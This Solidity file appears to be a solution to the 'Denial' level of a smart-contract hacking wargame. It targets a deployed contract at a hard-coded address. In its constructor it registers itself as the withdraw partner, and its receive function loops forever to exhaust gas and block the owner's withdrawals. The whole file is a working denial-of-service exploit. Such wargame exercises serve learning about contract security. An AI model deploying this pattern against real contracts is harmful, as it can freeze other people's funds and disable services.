// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../instances/Ilevel20.sol";

contract DenialHack {
    Denial level20 = Denial(payable(0x017b087824917015792463bd825E7c183dae1C3c));

    constructor() public {
        level20.setWithdrawPartner(address(this));
    }

    receive() external payable {
        while (true) {}
    }
}

